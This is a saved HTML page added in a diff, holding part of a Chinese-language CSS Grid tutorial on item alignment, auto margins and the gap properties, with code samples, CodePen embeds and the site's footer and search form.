+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">10</span></span>px;</span></span></span><span class="value"></span></span>
+
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">--justify-content</span></span></span><span class="rule">:<span class="value"><span class="value"> start;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">align-content</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">var(--justify-content)</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p>效果如下：</p>
+
+<div style="margin-bottom: 20px">
+<iframe height="680" style="width: 100%;" scrolling="no" title="" src="./Grid布局：12-网格布局中的对齐方式和间距_files/YzVYJEN(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/YzVYJEN">
+  </a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p><code>justify-content</code> 取不同值的效果如下：</p>
+
+<p><img src="./Grid布局：12-网格布局中的对齐方式和间距_files/css-grid-291.jpg" alt=""></p>
+
+<h3 class="content-title" data-index="3">对齐和自动外边距</h3>
+
+<p>还记得 Flexbox 布局中 Flex项目使用 <code>margin</code> 为 <code>auto</code>的效果：</p>
+
+<p><img src="./Grid布局：12-网格布局中的对齐方式和间距_files/flex-56.png" alt=""></p>
+
+<p>这种方式也可以用于网格项目中。也能达到相似的效果。比如：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">3</span></span>, <span class="number"><span class="number">100</span></span>px)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">3</span></span>, <span class="number"><span class="number">100</span></span>px)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-areas</span></span></span><span class="rule">:<span class="value"><span class="value">
+        <span class="string"><span class="string">"a a b"</span></span>
+        <span class="string"><span class="string">"a a b"</span></span>
+        <span class="string"><span class="string">"c d d"</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">height</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">500</span></span>px;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">width</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">500</span></span>px;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">10</span></span>px;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(1)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> a;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">margin-left</span></span></span><span class="rule">:<span class="value"><span class="value"> auto;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(2)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> b;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">margin-right</span></span></span><span class="rule">:<span class="value"><span class="value"> auto;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(3)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> c;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">margin-top</span></span></span><span class="rule">:<span class="value"><span class="value"> auto;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(4)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> d;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">margin-bottom</span></span></span><span class="rule">:<span class="value"><span class="value"> auto;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="680" style="width: 100%;" scrolling="no" title="Align with margin: auto" src="./Grid布局：12-网格布局中的对齐方式和间距_files/abWEQZp(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/abWEQZp">
+  Align with margin: auto</a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p>效果如下：</p>
+
+<p><img src="./Grid布局：12-网格布局中的对齐方式和间距_files/css-grid-292.jpg" alt=""></p>
+
+<p>你可能已经想到了，在 CSS 网格布局中，如果你希望某个网格项目在网格区域中垂直居中，除了使用 <code>place-self</code>之外：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__item</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">place-self</span></span></span><span class="rule">:<span class="value"><span class="value"> center;</span></span></span><span class="value"></span></span>
+
+    <span class="rule"><span class="rule">// 等同
+    <span class="attribute"><span class="attribute">align-self</span></span>:<span class="value"><span class="value"> center;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">justify-self</span></span></span><span class="rule">:<span class="value"><span class="value"> center;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p>还可以在网格项目中使用<code>margin: auto</code>让网格项目水平垂直居中：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">4</span></span>, <span class="number"><span class="number">100</span></span>px)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">4</span></span>, <span class="number"><span class="number">100</span></span>px)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-areas</span></span></span><span class="rule">:<span class="value"><span class="value">
+        <span class="string"><span class="string">"a a b b"</span></span>
+        <span class="string"><span class="string">"a a b b"</span></span>
+        <span class="string"><span class="string">"a a b b"</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">height</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">500</span></span>px;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">width</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">500</span></span>px;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">10</span></span>px;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(1)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> a;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">place-self</span></span></span><span class="rule">:<span class="value"><span class="value"> center;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(2)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> b;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">margin</span></span></span><span class="rule">:<span class="value"><span class="value"> auto;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="680" style="width: 100%;" scrolling="no" title="" src="./Grid布局：12-网格布局中的对齐方式和间距_files/QWvaJpe(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/QWvaJpe">
+  </a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p>网格项目<code>i1</code>和<code>i2</code>用了两种不同的方式，分别让网格项目在把对应的网格区域（<code>a</code>和<code>b</code>）水平垂直居中：</p>
+
+<p><img src="./Grid布局：12-网格布局中的对齐方式和间距_files/css-grid-293.jpg" alt=""></p>
+
+<h2 class="content-title" data-index="2">网格布局中的间距</h2>
+
+<p>在 CSS 网格布局中的间距指的是网格轨道与网格轨道之间的间距，即列间距或行间距，它有一个专业的术语，叫沟槽。可以在网格容器上显式的设置 <code>row-gap</code> 和 <code>column-gap</code> 来指定网格轨道之间的间距：</p>
+
+<ul>
+<li><strong><code>row-gap</code></strong>：指定行与行之间的间距</li>
+<li><strong><code>column-gap</code></strong>：指定列与列之间的间距</li>
+</ul>
+
+<p>这两个属性都接受相同的值，即 <code>normal</code> 和 <code>&lt;length-percentage&gt;</code>，但<code>fr</code>单位不能用于<code>gap</code>属性中。</p>
+
+<p>我们来看一个简单的示例：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">4</span></span>, <span class="number"><span class="number">1</span></span>fr)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">width</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">100</span></span>%;</span></span></span><span class="value"></span></span>
+
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">--row-gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">10</span></span>px;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">--column-gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">10</span></span>px;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">row-gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">var(--row-gap)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">column-gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">var(--column-gap)</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="500" style="width: 100%;" scrolling="no" title="" src="./Grid布局：12-网格布局中的对齐方式和间距_files/bGWaQzG(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/bGWaQzG">
+  </a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p>调整示例中的滑块，你可以看到相应的行间距和列间距会做出调整：</p>
+
+<div style="margin-bottom: 20px">
+<video controls="" width="100%" style="width: 100%; aspect-ratio: 16 / 9;" poster="/sites/default/files/blogs/2021/2104/css-grid-294.jpg">
+    <source src="/sites/default/files/blogs/2021/2104/css-grid-294.mp4" type="video/mp4">
+</video>
+</div>
+
+<p><code>row-gap</code> 和 <code>column-gap</code> 有一个简写属性 <code>gap</code>：</p>
+
+<pre class="http"><code class="http"><span class="attribute"><span class="attribute">gap</span></span>: <span class="string"><span class="string">row-gap column-gap</span></span>
+</code></pre>
+
+<p>如果<code>gap</code>第二个值<code>column-gap</code>省略不写的话，则和 <code>row-gap</code>值相同，即行和列轨道之间的间距相等。</p>
+
+<p>注意，有三个老的属性（只属于 CSS 网格规范中的）：</p>
+
+<ul>
+<li><code>row-gap</code> 对应 <code>grid-row-gap</code>，行轨道间距</li>
+<li><code>column-gap</code> 对应 <code>grid-column-gap</code>，列轨道间间距</li>
+<li><code>grid-gap</code> 对应 <code>gap</code></li>
+</ul>
+
+<p>虽然有三个对应的新属性替代，但它们依旧在网格布局中生效。</p>
+
+<p><strong>特别要注意的是，用于网格轨道对齐的属性 <code>justify-content</code> 和 <code>align-content</code> 将会影响<code>gap</code>值的大小</strong>。</p>
+
+<p>由于<code>gap</code>只接受两个值，只能设置行间距和列间距，并且所有行间距和列间距都相等。在 CSS 网格布局中无法使用 <code>gap</code>（或它的子属性<code>row-gap</code>和 <code>column-gap</code>）为不同网格轨道之间设置不同的间距。但我们可以通过网格轨道尺寸来模拟间距，比如：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>fr <span class="number"><span class="number">10</span></span>px <span class="number"><span class="number">1</span></span>fr <span class="number"><span class="number">20</span></span>px <span class="number"><span class="number">1</span></span>fr <span class="number"><span class="number">30</span></span>px <span class="number"><span class="number">1</span></span>fr;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>fr <span class="number"><span class="number">10</span></span>px <span class="number"><span class="number">1</span></span>fr <span class="number"><span class="number">20</span></span>px <span class="number"><span class="number">1</span></span>fr;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(1)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span> / <span class="number"><span class="number">1</span></span> / <span class="number"><span class="number">2</span></span> / <span class="number"><span class="number">2</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(2)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span> / <span class="number"><span class="number">3</span></span> / <span class="number"><span class="number">2</span></span> / <span class="number"><span class="number">4</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(3)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span> / <span class="number"><span class="number">5</span></span> / <span class="number"><span class="number">2</span></span> / <span class="number"><span class="number">6</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(4)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span> / <span class="number"><span class="number">7</span></span> / <span class="number"><span class="number">2</span></span> / <span class="number"><span class="number">8</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(5)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">3</span></span> / <span class="number"><span class="number">1</span></span> / <span class="number"><span class="number">4</span></span> / <span class="number"><span class="number">2</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(6)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">3</span></span> / <span class="number"><span class="number">3</span></span> / <span class="number"><span class="number">4</span></span> / <span class="number"><span class="number">4</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(7)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">3</span></span> / <span class="number"><span class="number">5</span></span> / <span class="number"><span class="number">4</span></span> / <span class="number"><span class="number">6</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(8)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">3</span></span> / <span class="number"><span class="number">7</span></span> / <span class="number"><span class="number">4</span></span> / <span class="number"><span class="number">8</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(9)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">5</span></span> / <span class="number"><span class="number">1</span></span> / <span class="number"><span class="number">6</span></span> / <span class="number"><span class="number">2</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="500" style="width: 100%;" scrolling="no" title="" src="./Grid布局：12-网格布局中的对齐方式和间距_files/BaRJvpj(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/BaRJvpj">
+  </a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p>正如示例效果所示，虽然使用网格轨道尺寸可以模拟出不同的网格轨道之间的间距，但这样做相对而言非常的麻烦，而且可控性差：</p>
+
+<p><img src="./Grid布局：12-网格布局中的对齐方式和间距_files/css-grid-295.jpg" alt=""></p>
+
+<p>除此之外，还可以在网格项目中使用 <code>margin</code> 来设置，不同的是，网格项目设置<code>margin</code> 是用来控制网格项目的边缘和网格区域之间的边缘：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">4</span></span>, <span class="number"><span class="number">100</span></span>px)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">4</span></span>, <span class="number"><span class="number">100</span></span>px)</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">margin</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">10</span></span>px;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="500" style="width: 100%;" scrolling="no" title="" src="./Grid布局：12-网格布局中的对齐方式和间距_files/BaRJvxL(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/BaRJvxL">
+  </a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p>效果如下：</p>
+
+<p><img src="./Grid布局：12-网格布局中的对齐方式和间距_files/css-grid-296.jpg" alt=""></p>
+
+<p><code>margin</code>在网格项目中的使用和其他地方使用相似，但不会有垂直方向的<code>margin</code>重叠：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__item</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">margin</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">10</span></span>px <span class="number"><span class="number">20</span></span>px <span class="number"><span class="number">30</span></span>px <span class="number"><span class="number">40</span></span>px;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p><img src="./Grid布局：12-网格布局中的对齐方式和间距_files/css-grid-297.jpg" alt=""></p>
+
+<p>另外，网格项目中的<code>margin</code>和网格容器上的<code>gap</code>可以同时使用，增更大的增加网格项目之间的间距，但他们各自作用是有区别的：</p>
+
+<ul>
+<li><code>gap</code>是用来设置网格轨道之间的间距</li>
+<li><code>margin</code>是用来设置网格项目外侧边缘和网格区域边缘之间的间距</li>
+</ul>
+
+<p>比如：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">4</span></span>, <span class="number"><span class="number">100</span></span>px)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">4</span></span>, <span class="number"><span class="number">100</span></span>px)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">10</span></span>px;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">margin</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">10</span></span>px;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="500" style="width: 100%;" scrolling="no" title="gap and margin" src="./Grid布局：12-网格布局中的对齐方式和间距_files/vYmpvvO(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/vYmpvvO">
+  gap and margin</a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p><img src="./Grid布局：12-网格布局中的对齐方式和间距_files/css-grid-298.jpg" alt=""></p>
+
+<p>规范中提供了一张图，描述了 <code>gap</code> 和 <code>margin</code> 分别使用和同时使用的效果：</p>
+
+<p><img src="./Grid布局：12-网格布局中的对齐方式和间距_files/css-grid-299.svg" alt=""></p>
+
+<h2 class="content-title" data-index="2">小结</h2>
+
+<p>在今天这篇访问中主要和大家探讨了网格布局中的对齐方式（即 Box Alignment 在 CSS 网格布局中的使用），以及网格轨道之间的间距，网格项目之间的间距等相关知识。接下来将和大家再探讨网格布局的等比缩放。感兴趣的的同学，请持续关注后续的更新。</p>
+</div></div></div>  </div>
+
+  
+   
+    <div id="node_footer" class="clearfix">
+              <div class="previous-next"><span class="prev">上一篇: </span><a href="https://www.w3cplus.com/css/how-to-get-a-pixel-perfect-and-linearly-scaled-ui.html" target="_blank">如何构建一个完美缩放的UI界面</a> | <span class="next">下一篇: </span><a href="https://www.w3cplus.com/css/grid-layout-part-13.html" target="_blank">图解CSS: Grid布局（Part13）</a></div>            
+    </div>
+
+        
+
+</div>  </div>
+</div>
+  </div>
+
+        </div>
+
+      </div>
+    </div>
+
+    
+          <div id="sidebar-second" class="col-extra" style="position: sticky; top: 80px;">
+        <!-- <script type="text/javascript">document.write(unescape('%3Cdiv id="bdcs"%3E%3C/div%3E%3Cscript charset="utf-8" src="//rp.baidu.com/rp3w/3w.js?sid=10994702955876242907') + '&t=' + (Math.ceil(new Date()/3600000)) + unescape('"%3E%3C/script%3E'));</script> -->
+          <div class="region region-sidebar-second">
+    <div id="block-custom-search-blocks-1" class="block block-custom-search-blocks">
+
+    
+  <div class="content">
+    <form class="search-form" role="search" action="https://www.w3cplus.com/css/grid-layout-part-12.html?expire=1699863107&amp;code=GsOhRzlRnIU&amp;sign=de3acde2366c895e767c8e794c770118" method="post" id="custom-search-blocks-form-1" accept-charset="UTF-8" target="_self"><div><div class="form-item form-type-textfield form-item-custom-search-blocks-form-1">
+  <label class="element-invisible" for="edit-custom-search-blocks-form-1--2">Search this site </label>
+ <input title="请输入您想搜索的关键词。" class="custom-search-box form-text" placeholder="" type="text" id="edit-custom-search-blocks-form-1--2" name="custom_search_blocks_form_1" value="" size="15" maxlength="128">
+</div>
+<input type="hidden" name="delta" value="1">
+<input type="hidden" name="form_build_id" value="form-6yOiSz4sKV9PxJAqb8lAmstlLsrN1izA9xXZT5YtQFw">
+<input type="hidden" name="form_id" value="custom_search_blocks_form_1">
